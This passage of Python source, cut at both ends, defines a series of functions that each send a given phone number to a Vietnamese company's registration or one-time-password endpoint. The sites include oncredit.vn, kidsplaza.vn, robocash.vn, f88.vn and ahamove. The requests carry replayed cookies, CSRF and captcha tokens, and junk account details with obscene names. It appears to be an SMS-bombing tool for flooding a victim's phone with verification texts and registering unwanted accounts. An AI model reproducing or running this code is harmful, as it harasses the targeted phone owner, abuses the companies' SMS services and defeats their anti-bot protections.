    "_hjSession_1876820":"eyJpZCI6IjFlYjE4NzU2LWRiZGYtNGQxNS04MzI5LWFjZTM0MmU1ZjYxNCIsImNyZWF0ZWQiOjE2OTYwNjg3Njk4MjMsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9",
    "_hjAbsoluteSessionInProgress":"0",
    "GN_SESSION_ID_KEY":"55b180dc-d43a-4f99-9bfb-c2a8003378fe",
    "_ga":"GA1.1.680582930.1695223549",
    "_hjSessionUser_2975850":"eyJpZCI6ImQ0ZGZlYThjLTJjMDItNWE5Ny05Y2YzLWRlNWVlMzA2ZmFmYyIsImNyZWF0ZWQiOjE2OTYwNjg3NzI2OTcsImV4aXN0aW5nIjpmYWxzZX0=",
    "_hjFirstSeen":"1",
    "_hjIncludedInSessionSample_2975850":"0",
    "_hjSession_2975850":"eyJpZCI6IjZkMzMxNWI1LTdhYzgtNGM0Mi1hZmUyLWVhY2JjYzRmZDJkOSIsImNyZWF0ZWQiOjE2OTYwNjg3NzI2OTgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9",
    "_ga_462Z3ZX24C":"GS1.1.1696068768.43.1.1696068780.48.0.0",
}
    headers={
    "authority":"oncredit.vn",
    "accept":"application/json, text/javascript, */*; q=0.01",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://oncredit.vn",
    "pragma":"no-cache",
    "referer":"https://oncredit.vn/registration",
    "sec-ch-ua":"\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "data[typeData]":"sendCodeReg",
    "data[phone]":phone,
    "data[email]":"",
    "data[captcha1]":"1",
    "data[lang]":"vi",
    "CSRFName":"CSRFGuard_ajax",
    "CSRFToken":"ABK736s8BS7Nk28hankQ5KiiYKnZdKTNk8ybYAB8ERzeTB34daQkZFZ8SRE23ieh",
}
    response=requests.post("https://oncredit.vn/?ajax",cookies=cookies,headers=headers,data=data)
def piza(phone):
    cookies={
    "cdp_customerIdentify":"1",
    "_atm_objs":"eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNjkxMTMyOTkxOTI1fQ%3D%3D",
    "_pk_ref.564990546.fc16":"%5B%22%22%2C%22%22%2C1691132992%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D",
    "_pk_ses.564990546.fc16":"*",
    "_gcl_au":"1.1.750634817.1691132992",
    "mage-cache-storage":"%7B%7D",
    "mage-cache-storage-section-invalidation":"%7B%7D",
    "_gcl_aw":"GCL.1691132997.CjwKCAjww7KmBhAyEiwA5-PUSs-mCDku8Sxt0B5X_-yhmAOnL6cUXPEwZJkOzTTVT-WicOl_DV9YiRoC3-sQAvD_BwE",
    "form_key":"BaxX2D1YXnWpW3Jp",
    "_ac_au_gt":"1691132993384",
    "_ga":"GA1.1.1612590689.1691132998",
    "_fbp":"fb.1.1691132998475.1386127342",
    "_asm_uid":"1200155066",
    "cdp_session":"1",
    "cdp_blocked_sid_1207269":"1",
    "recently_viewed_product":"%7B%7D",
    "recently_viewed_product_previous":"%7B%7D",
    "recently_compared_product":"%7B%7D",
    "recently_compared_product_previous":"%7B%7D",
    "product_data_storage":"%7B%7D",
    "mage-messages":"",
    "PHPSESSID":"gj8tho2itg02igcokprgmcjuf4",
    "form_key":"BaxX2D1YXnWpW3Jp",
    "_tt_enable_cookie":"1",
    "_ttp":"h1r1vnub7F72iOjwOvqUYxSNAyc",
    "_ac_client_id":"1200147765.1691133070",
    "au_id":"1200147765",
    "private_content_version":"2fa7f4ae56c1c82407ce8b8a65c64a5a",
    "_asm_visitor_type":"r",
    "mage-cache-sessid":"true",
    "_cdp_cfg":"1",
    "cdp_blocked_sid_5056307":"true",
    "_utm_objs":"",
    "_pk_id.564990546.fc16":"1200147765.1691132992.1.1691133481.1691132992.",
    "_ac_an_session":"zhzqzgzgzmzgzlzmzhzhzdzjzdzizlzqzizizgzgznzrzhzdzizdzizlzqzizizgzgznzrzhzdzizlzqzizizgzgznzrzhzdzizdzhznzdzhzd2f27zdzgzdzezizd",
    "_ga_T93VCQ3ZQS":"GS1.1.1691132998.1.1.1691133485.25.0.0",
    "cto_bundle":"AEYB1l9hMjZ2c3JEcU9hVlI2c0FGUTBkeVV6ZXRUUEJKNjhwOVdqenR6Z0FuYnB1WW1LOTQ4ZHBZOEViRUJ0Q2dzajN2b3lRMDRYbjB5VTVoSEwlMkJnWjFqY05Ualg0WnpGMkpqY2dNWXNGcmMlMkI3eHh2MmthNnY2UXY1VndkeVpIVFY2c1BldDRnOFdkQUk3ZzMlMkJRQlpHVXBYYXclM0QlM0Q",
    "section_data_ids":"%7B%22customer%22%3A1691133495%2C%22cart%22%3A1691133495%2C%22shipping_address_selected%22%3A1691133495%2C%22compare-products%22%3A1691133495%2C%22last-ordered-items%22%3A1691133495%2C%22directory-data%22%3A1691133495%2C%22captcha%22%3A1691133495%2C%22instant-purchase%22%3A1691133495%2C%22persistent%22%3A1691133495%2C%22review%22%3A1691133495%2C%22wishlist%22%3A1691133495%2C%22faq%22%3A1691133495%2C%22ammessages%22%3A1691133495%2C%22rewards%22%3A1691133495%2C%22ins%22%3A1691133495%2C%22custom_address_local_storage_data%22%3A1691133495%2C%22recently_viewed_product%22%3A1691133495%2C%22recently_compared_product%22%3A1691133495%2C%22product_data_storage%22%3A1691133495%2C%22paypal-billing-agreement%22%3A1691133495%7D",
}
    headers={
    "authority":"www.kidsplaza.vn",
    "accept":"*/*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://www.kidsplaza.vn",
    "pragma":"no-cache",
    "referer":"https://www.kidsplaza.vn/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    json_data={
    "data":{
        "password":"Vjyi1234",
        "confirm_password":"Vjyi1234",
        "phone":phone,
        "email":"concak@gmail.com",
        "name":"tên cái lồn",
        "website_id":"1",
},
}
    response=requests.post(
    "https://www.kidsplaza.vn/rest/hn/V1/customer/account/register/on-site",
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def robot(phone):
    cookies={
    "_gcl_au":"1.1.1698620040.1690890499",
    "_fbp":"fb.1.1690890500462.1646373504",
    "mousestats_vi":"78a3bb625f6a326b5378",
    "_ym_uid":"1690890501680762237",
    "_ym_d":"1690890501",
    "_tt_enable_cookie":"1",
    "_ttp":"9xN9J9ceiqBWtCD4J-snzQy-IMK",
    "supportOnlineTalkID":"PdWml2EntxKFO94Tzz5Tukkfs3Mpr587",
    "_gid":"GA1.2.1482684126.1691085426",
    "_ym_isad":"2",
    "__cfruid":"e2a605e6b2debb72dc47446271f7c7af82536dd8-1691137448",
    "mousestats_si":"33cfb258b0d250994a1d",
    "_clck":"1tdoi1d|2|fdv|0|1308",
    "_ym_visorc":"w",
    "XSRF-TOKEN":"eyJpdiI6Im92OWYwNlJSaExmVTZFbjBucWl2Q0E9PSIsInZhbHVlIjoiS20vbWx5WWxrNXplZ3BqZ3p2aHoyY3JVT0lMSTgwSi8xaXhnSWZPN0Nuam1BS291MUxCb3BTUEU0T3hSekVDaG5ZNjdMQnNvWThsNGlZanN6dnNoWmxscDd3ajEvN1pJQmFXNzlWTk1PK0VyZ2hhU0xCVzg0WmJwYmlCSkkxTW4iLCJtYWMiOiIzM2Q1MzE5ZTZiNzc4NGM1MGJjZWJiODNlOGZhZDg0N2ZiMjIzNjY3OTNkYTAyNTZhNzAwNWE2Y2Y5YzVkMTg5IiwidGFnIjoiIn0%3D",
    "sessionid":"eyJpdiI6IjRCNzdSa1VzR2lydHFQNXZKUkt4VHc9PSIsInZhbHVlIjoiSlRmU1VWL3BpVlRUK2cvNHN6SFhDQitrZzBkLy81MExaSWd3UE9UMzFFOHpQN0V2N1JqSjcwTWZ4QVBqcFZxVWpxK0xwTnorKzVGeDRhZG9IRFo3WVBoL3BITDRvMHpPeG5SWDlnMGlsS3M3TEw3K1pBbXJjOUNLTlRYdUU3WlUiLCJtYWMiOiI0MTNiZjJkZDY5MzU1MmFkOTBjM2ZkMjUyYTQzNDA1NWU3NTM2NjE0YmM4Mzg4YjZkYTNiYTgwMDhjMzg4N2VhIiwidGFnIjoiIn0%3D",
    "utm_uid":"eyJpdiI6IjAza0ZITmxwaThIcWdLRm1DUTkxZGc9PSIsInZhbHVlIjoiRmFMeW1RZWgyY2ZLSndxS1p0N1NVN3Myems1Ty9pUWlDczN0MnhNVmJhRXNITDZ0RU9iVWpMTDBTQitjQXlBbkNybWdjT1RDWkFIUDlsRHR3S3RRalNQcHdicWptQkhiN1l4VTVHOGE1RHgwc3MrYW5ITkV1b1pmTVlIRWtkclEiLCJtYWMiOiIwNjlmMmI0ZGM5ZGZkMzdkYWU1ZDUxMWM1NzU1NTkyNjE0NTY3N2ZmOGY2MmFkM2JmMzk2YjRiOTI4ZjkwZGFkIiwidGFnIjoiIn0%3D",
    "ec_etag_utm":"8e8f2df3-37da-cbb8-92ad-834def089367",
    "ec_cache_utm":"8e8f2df3-37da-cbb8-92ad-834def089367",
    "ec_etag_client":"false",
    "ec_cache_client":"false",
    "ec_cache_client_utm":"%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D",
    "ec_etag_client_utm":"%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D",
    "_ga":"GA1.1.838151185.1690890503",
    "_ga_EBK41LH7H5":"GS1.1.1691137450.4.1.1691137476.0.0.0",
    "_ga_0YC73N6F7R":"GS1.2.1691137450.3.1.1691137477.33.0.0",
    "_clsk":"1qlfd4s|1691137478234|2|1|z.clarity.ms/collect",
    "ec_png_utm":"8e8f2df3-37da-cbb8-92ad-834def089367",
    "uid":"8e8f2df3-37da-cbb8-92ad-834def089367",
    "ec_png_client":"false",
    "client":"false",
    "ec_png_client_utm":"%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D",
    "client_utm":"%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D",
}
    headers={
    "authority":"robocash.vn",
    "accept":"*/*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://robocash.vn",
    "pragma":"no-cache",
    "referer":"https://robocash.vn/register",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "phone":phone,
    "_token":"ZrC9tGxwcMfUIY8eTecrRiRQgA0G6AMjYTHBUdTb",
}
    response=requests.post("https://robocash.vn/register/phone-resend",cookies=cookies,headers=headers,data=data)
def phuc(phone):
    headers={
    "authority":"api-crownx.winmart.vn",
    "accept":"application/json",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "authorization":"Bearer undefined",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://order.phuclong.com.vn",
    "pragma":"no-cache",
    "referer":"https://order.phuclong.com.vn/",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"cross-site",
    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
}
    json_data={
    "phoneNumber":phone,
    "fullName":"nguyễn văn cặc",
    "email":"concak@gmail.com",
    "password":"vjyy1234",
}
    response=requests.post("https://api-crownx.winmart.vn/as/api/plg/v1/user/register",headers=headers,json=json_data)
def emart(phone):
    cookies={
    "emartsess":"gmdbftq46lqooc1s5iv9l7nsn0",
    "default":"e6ec14ce933f55f7f1a9bb7355",
    "language":"vietn",
    "currency":"VND",
    "_fbp":"fb.2.1691143292627.1008340188",
    "_gid":"GA1.3.332853186.1691143293",
    "_gat_gtag_UA_117859050_1":"1",
    "_ga_ZTB26JV4YJ":"GS1.1.1691143293.1.1.1691143433.0.0.0",
    "_ga":"GA1.1.736434119.1691143293",
}
    headers={
    "Accept":"application/json, text/javascript, */*; q=0.01",
    "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Cache-Control":"no-cache",
    "Connection":"keep-alive",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Origin":"https://emartmall.com.vn",
    "Pragma":"no-cache",
    "Referer":"https://emartmall.com.vn/index.php?route=account/register",
    "Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Site":"same-origin",
    "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "X-Requested-With":"XMLHttpRequest",
}
    data={
    "mobile":phone,
}
    response=requests.post(
    "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
    cookies=cookies,
    headers=headers,
    data=data,
)
def hana(phone):
    headers={
    "authority":"api.hanagold.vn",
    "accept":"application/json",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://hanagold.vn",
    "pragma":"no-cache",
    "referer":"https://hanagold.vn/",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "token":"null",
    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
}
    json_data={
    "email":"",
    "mobile":phone,
    "fullname":"con cặc",
    "password":"vjyy1234",
}
    response=requests.post("https://api.hanagold.vn/app/auth/register",headers=headers,json=json_data)
def med(phone):
    headers={
    "Accept":"application/json, text/plain, */*",
    "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Cache-Control":"no-cache",
    "Connection":"keep-alive",
    "Content-Type":"application/json;charset=UTF-8",
    "Origin":"https://id-v121.medpro.com.vn",
    "Pragma":"no-cache",
    "Referer":"https://id-v121.medpro.com.vn/",
    "Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Site":"same-site",
    "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "appid":"medpro",
    "cskhtoken":"",
    "locale":"",
    "momoid":"",
    "osid":"",
    "ostoken":"",
    "partnerid":"medpro",
    "platform":"pc",
}
    json_data={
    "fullname":"người dùng medpro",
    "deviceId":"401387b523eda9fc5998c36541400134",
    "phone":phone,
    "type":"password",
}
    response=requests.post("https://api-v2.medpro.com.vn/user/phone-register",headers=headers,json=json_data)
def ghn(phone):
    headers={
    "authority":"online-gateway.ghn.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://sso.ghn.vn",
    "pragma":"no-cache",
    "referer":"https://sso.ghn.vn/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}
    json_data={
    "phone":phone,
    "type":"register",
}
    response=requests.post("https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",headers=headers,json=json_data)
def shop(phone):
    cookies={
    "_gcl_au":"1.1.1745429184.1691586808",
    "_fbp":"fb.1.1691586808676.1451418847",
    "_ga":"GA1.2.1936138960.1691586808",
    "_gid":"GA1.2.1897491687.1691674994",
    "_gat_UA-78703708-2":"1",
    "_ga_P138SCK22P":"GS1.1.1691674994.3.1.1691675011.43.0.0",
}
    headers={
    "Accept":"*/*",
    "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Cache-Control":"no-cache",
    "Connection":"keep-alive",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Origin":"https://shopiness.vn",
    "Pragma":"no-cache",
    "Referer":"https://shopiness.vn/",
    "Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Site":"same-origin",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "X-Requested-With":"XMLHttpRequest",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
}
    data={
    "action":"verify-registration-info",
    "phoneNumber":phone,
    "refCode":"",
}
    response=requests.post("https://shopiness.vn/ajax/user",cookies=cookies,headers=headers,data=data)
def gala(phone):
    headers={
    "authority":"api.glxplay.io",
    "accept":"*/*",
    "accept-language":"vi",
    "access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI1NDhkMTZiZC1lZDdmLTQyYzEtOGRiMS02NzJkOTFmYzE2NDAiLCJkaWQiOiJkYTAzOTBlYS1lOWYwLTQ1M2YtODAzYS0xNjk2YTAxOTU3ZDciLCJpcCI6IjQyLjExNC41Ni4xNjEiLCJtaWQiOiJOb25lIiwicGx0Ijoid2VifG1vYmlsZXxpb3N8MTMuMi4zfG1vYmlsZXNhZmFyaSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE2OTExNDQ3NzQsImV4cCI6MTcwNjY5Njc3NH0.s32e3kay84vDwvSen5thWBjGUwfDErjCNT-lBaGX4Rk",
    "cache-control":"no-cache",
    "origin":"https://galaxyplay.vn",
    "pragma":"no-cache",
    "referer":"https://galaxyplay.vn/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"cross-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    params={
    "phone":phone,
}
    response=requests.post("https://api.glxplay.io/account/phone/verify",params=params,headers=headers)
def khia(phone):
    cookies={
    "_fbp":"fb.1.1690752545643.1919078292",
    "_ym_uid":"1690752547366622461",
    "_ym_d":"1690752547",
    "_fw_crm_v":"0eda0a58-8919-4dba-a200-a8bd03f55eb5",
    "_gid":"GA1.2.2093400635.1693926716",
    "_gat_UA-145475427-1":"1",
    "_ym_isad":"2",
    "_ym_visorc":"w",
    "_ga_C4D01W1NNN":"GS1.1.1693926716.6.1.1693926729.47.0.0",
    "_ga":"GA1.1.541521957.1690752545",
    "_ga_SRXSFEV4P2":"GS1.2.1693926717.6.1.1693926729.48.0.0",
}
    headers={
    "authority":"api.senmo.vn",
    "accept":"*/*",
    "accept-language":"vi",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://senmo.vn",
    "pragma":"no-cache",
    "referer":"https://senmo.vn/user/login",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
}
    json_data={
    "phone":phone,
}
    response=requests.post("https://api.senmo.vn/api/user/send-one-time-password",cookies=cookies,headers=headers,json=json_data)
def ican(phone):
    cookies={
    "_gcl_au":"1.1.2125290249.1693717654",
    "_ga_LM3PQNHV6S":"GS1.1.1693717653.1.0.1693717653.60.0.0",
    "_fbp":"fb.1.1693717654221.1228643585",
    "_gid":"GA1.2.491438287.1693717654",
    "_gat_gtag_UA_201462250_4":"1",
    "_gat_UA-222516876-1":"1",
    "_ga_JLL9R732MK":"GS1.1.1693717654.1.0.1693717654.0.0.0",
    "_ga":"GA1.1.1551039073.1693717654",
    "_hjSessionUser_3154488":"eyJpZCI6ImNhZjFlNzBjLTVkYzYtNTEyNS1hMWM3LWQ4MjlkNGVkZTEyMiIsImNyZWF0ZWQiOjE2OTM3MTc2NTQ0NzAsImV4aXN0aW5nIjpmYWxzZX0=",
    "_hjFirstSeen":"1",
    "_hjIncludedInSessionSample_3154488":"0",
    "_hjSession_3154488":"eyJpZCI6ImMwYzRkZTYzLWExYTMtNGRiMC1hYTA4LTcwZWIxZmRjM2I3MiIsImNyZWF0ZWQiOjE2OTM3MTc2NTQ0NzEsImluU2FtcGxlIjpmYWxzZX0=",
    "_hjAbsoluteSessionInProgress":"0",
    "_ga_FMXKZXNRJB":"GS1.1.1693717654.1.1.1693717654.60.0.0",
    "_ga_T14T78MGX8":"GS1.2.1693717654.1.0.1693717654.0.0.0",
    "_ga_5KHZV6MD4J":"GS1.1.1693717662.1.1.1693717662.0.0.0",
    "_ga":"GA1.3.1551039073.1693717654",
    "_gid":"GA1.3.491438287.1693717654",
    "_gat_UA-213798897-3":"1",
    "_ga_6KG5YFEGLV":"GS1.3.1693717664.1.0.1693717664.0.0.0",
}
    headers={
    "Accept":"*/*",
    "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Cache-Control":"no-cache",
    "Connection":"keep-alive",
    "Origin":"https://id.icankid.vn",
    "Pragma":"no-cache",
    "Referer":"https://id.icankid.vn/auth",
    "Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Site":"same-origin",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "content-type":"application/json",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
}
    json_data={
    "phone":phone,
    "challenge_code":"a5e7d4df2f4f9d28db1a45c19cfb423433b5a0910e47326dd27332c2a95f24db",
    "challenge_method":"SHA256",
}
    response=requests.post("https://id.icankid.vn/api/otp/challenge/",cookies=cookies,headers=headers,json=json_data)
def f88(phone):
    headers={
        "Host":"api.f88.vn",
        "accept":"application/json, text/plain, */*",
        "content-encoding":"gzip",
        "user-agent":"Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
        "content-type":"application/json",
        "origin":"https://online.f88.vn",
        "referer":"https://online.f88.vn/",
}
    data={
        "phoneNumber":phone,
        "recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO",
        "source":"Online"
}
    response=requests.post("https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP",json=data,headers=headers)
def ahamove(phone):
    mail=random_string(6)
    Headers={"Host":"api.ahamove.com","content-length":"114","sec-ch-ua":"\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform":"\"Android\"","origin":"https://app.ahamove.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://app.ahamove.com/","accept-encoding":"gzip, deflate, br","accept-language":"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"}
    Datason=json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response=requests.post("https://api.ahamove.com/api/v3/public/user/register",data=Datason,headers=Headers)
def lon(phone):
    headers={
    "authority":"api.nhathuoclongchau.com.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "access-control-allow-origin":"*",
    "authorization":"",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "order-channel":"1",
    "origin":"https://nhathuoclongchau.com.vn",
    "pragma":"no-cache",
    "referer":"https://nhathuoclongchau.com.vn/",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "x-channel":"EStore",
}
    json_data={
